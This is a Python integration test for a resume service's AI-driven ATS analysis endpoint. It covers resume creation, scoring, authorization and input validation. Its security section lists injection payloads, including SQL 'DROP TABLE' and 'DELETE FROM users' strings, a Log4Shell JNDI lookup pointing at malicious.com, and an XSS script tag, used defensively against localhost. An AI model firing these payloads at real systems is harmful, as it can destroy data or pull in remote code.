import requests
import uuid

BASE_URL = "http://localhost:3000/api"
TIMEOUT = 30

# Placeholder for user authentication - replace with actual method to get a valid token.
def get_auth_token():
    # Implement authentication to get a JWT or session cookie
    # For demo, raise error if not implemented.
    raise NotImplementedError("Provide an auth token retrieval method here")

def test_ats_analysis_with_ai():
    auth_token = get_auth_token()
    headers = {
        "Authorization": f"Bearer {auth_token}",
        "Content-Type": "application/json",
        "Accept": "application/json",
    }

    created_resume_id = None
    # Minimal resume payload to create a resume for analysis
    resume_payload = {
        "title": "Test Resume " + str(uuid.uuid4()),
        "contactInfo": {
            "name": "John Doe",
            "email": "john.doe@example.com",
            "phone": "123-456-7890",
            "position": "Software Engineer"
        },
        "experiences": [
            {
                "title": "Software Engineer",
                "company": "Test Company",
                "startDate": "2020-01-01",
                "endDate": "2022-01-01",
                "description": "Developed awesome software."
            }
        ],
        "education": [
            {
                "school": "Test University",
                "degree": "BSc Computer Science",
                "startDate": "2015-09-01",
                "endDate": "2019-06-01"
            }
        ],
        "skills": ["Python", "REST APIs", "SQL"],
        # Optional fields can be omitted or filled with arrays
        "projects": [],
        "languages": [],
        "certifications": []
    }

    try:
        # Create a resume first to get its id
        create_resp = requests.post(
            f"{BASE_URL}/resumes",
            json=resume_payload,
            headers=headers,
            timeout=TIMEOUT,
        )
        assert create_resp.status_code == 201, f"Failed to create resume: {create_resp.text}"
        created_resume = create_resp.json()
        created_resume_id = created_resume.get("id")
        assert created_resume_id, "Created resume ID missing in response"

        analyze_endpoint = f"{BASE_URL}/resumes/{created_resume_id}/analyze"

        # 1. Test analyze without optional target job input
        analyze_payload = {}
        analyze_resp = requests.post(
            analyze_endpoint,
            json=analyze_payload,
            headers=headers,
            timeout=TIMEOUT,
        )
        assert analyze_resp.status_code == 200, f"Analyze failed without job input: {analyze_resp.text}"
        analyze_result = analyze_resp.json()

        # Validate presence and type of key fields
        assert "atsScore" in analyze_result, "atsScore missing in analyze response"
        assert isinstance(analyze_result["atsScore"], (int, float)), "atsScore is not a number"
        assert 0 <= analyze_result["atsScore"] <= 100, "atsScore not in 0-100 range"

        assert "improvementSuggestions" in analyze_result, "improvementSuggestions missing"
        assert isinstance(analyze_result["improvementSuggestions"], list), "improvementSuggestions not a list"

        # 2. Test analyze with valid target job input
        target_job = "Senior Python Developer with experience in REST APIs and SQL databases."

        analyze_payload_job = {
            "targetJob": target_job
        }
        analyze_resp_job = requests.post(
            analyze_endpoint,
            json=analyze_payload_job,
            headers=headers,
            timeout=TIMEOUT,
        )
        assert analyze_resp_job.status_code == 200, f"Analyze failed with job input: {analyze_resp_job.text}"
        analyze_result_job = analyze_resp_job.json()

        assert "atsScore" in analyze_result_job, "atsScore missing with job input"
        assert isinstance(analyze_result_job["atsScore"], (int, float)), "atsScore is not a number with job input"
        assert 0 <= analyze_result_job["atsScore"] <= 100, "atsScore not in 0-100 range with job input"

        assert "improvementSuggestions" in analyze_result_job, "improvementSuggestions missing with job input"
        assert isinstance(analyze_result_job["improvementSuggestions"], list), "improvementSuggestions not a list with job input"

        # 3. Security tests

        # Unauthorized access (no auth header)
        unauthorized_resp = requests.post(
            analyze_endpoint,
            json=analyze_payload,
            timeout=TIMEOUT,
        )
        assert unauthorized_resp.status_code in (401, 403), f"Unauthorized access did not fail properly: {unauthorized_resp.status_code}"

        # Injection attack vector in targetJob (SQL injection and prompt injection)
        injection_payloads = [
            "'; DROP TABLE resumes; --",
            "'); DELETE FROM users; --",
            "Senior dev'); SELECT * FROM users; --",
            "${jndi:ldap://malicious.com/a}",
            "<script>alert(1)</script>",
            "Normal job description; DROP TABLE resumes --"
        ]

        for injection in injection_payloads:
            injection_data = {"targetJob": injection}
            inj_resp = requests.post(
                analyze_endpoint,
                json=injection_data,
                headers=headers,
                timeout=TIMEOUT,
            )
            # It should not cause server error; expect 400 or sanitized handling
            assert inj_resp.status_code in (200, 400), f"Injection payload caused unexpected status: {inj_resp.status_code} for input {injection}"

        # Input validation: sending invalid data types
        invalid_payloads = [
            {"targetJob": 12345},          # number instead of string
            {"targetJob": None},           # null
            {"targetJob": ["array"]},      # array instead of string
            {"targetJob": {}}              # object instead of string
        ]
        for invalid_payload in invalid_payloads:
            invalid_resp = requests.post(
                analyze_endpoint,
                json=invalid_payload,
                headers=headers,
                timeout=TIMEOUT,
            )
            assert invalid_resp.status_code == 400, f"Invalid input {invalid_payload} not rejected"

    finally:
        # Clean up, delete the created resume if any
        if created_resume_id:
            try:
                del_resp = requests.delete(
                    f"{BASE_URL}/resumes/{created_resume_id}",
                    headers=headers,
                    timeout=TIMEOUT,
                )
                # Accept 200 or 204 as success
                assert del_resp.status_code in (200, 204), f"Failed to delete test resume: {del_resp.status_code} {del_resp.text}"
            except Exception as e:
                print(f"Warning: Cleanup failed for resume ID {created_resume_id}: {e}")

test_ats_analysis_with_ai()